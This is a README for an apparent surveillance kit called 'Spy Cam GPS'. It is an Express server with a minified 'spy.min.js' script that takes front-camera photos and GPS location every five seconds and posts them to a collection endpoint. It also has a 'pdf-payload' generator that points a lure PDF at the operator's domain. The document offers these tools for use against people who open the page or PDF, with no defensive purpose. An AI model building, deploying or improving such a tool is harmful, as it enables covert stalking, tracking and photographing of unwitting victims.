# Spy Cam GPS - Camera & Location Tracker

A web application that captures photos with GPS location data.

## Features
- Front camera photo capture
- GPS location tracking
- Auto-capture every 5 seconds
- Fallback to GPS-only if camera is denied
- Works on Android and iOS devices
- PDF generation capability

## Project Structure
```
.devcontainer/    # Dev container configuration
server/           # Express.js backend
  ├── index.js    # Main server file
  ├── package.json
  └── data/       # Auto-created for storing captures
client/           # Frontend files
  ├── index.html  # Full client interface
  └── spy.min.js  # Minified capture script
pdf-payload/      # PDF generation tools
  ├── generate_pdf.py
  ├── template.html
  └── requirements.txt
public/           # Static files served at root
  └── index.html
```

## Setup in GitHub Codespaces

### 1. Start the Server
```bash
cd server
npm install
npm start
```

The server will run on port 3000 and automatically forward in Codespaces.

### 2. Generate PDF (Optional)
```bash
cd pdf-payload
pip install -r requirements.txt
export SPY_DOMAIN="your-codespace-url.app.github.dev"
python generate_pdf.py
```

## Usage

### Web Interface
1. Open your Codespace URL in a browser (port 3000)
2. Grant camera and location permissions when prompted
3. Photos with GPS data will be captured every 5 seconds
4. Data is saved to `server/data/` directory

### Endpoints
- `GET /` - Serves the main application
- `POST /collect` - Receives capture data
- `GET /spy.min.js` - Minified capture script
- `GET /data/*` - Serves captured files

## Data Format
```json
{
  "uid": "unique-device-id",
  "img": "base64-encoded-jpeg",
  "gps": "latitude,longitude",
  "ts": 1699200000000,
  "ua": "user-agent-string"
}
```

Files saved as:
- `{uid}_{timestamp}.json` - Metadata
- `{uid}_{timestamp}.jpg` - Photo

## Requirements
- Node.js 18+
- Python 3.x (for PDF generation)
- Modern browser with camera and geolocation support

## License
See LICENSE file.
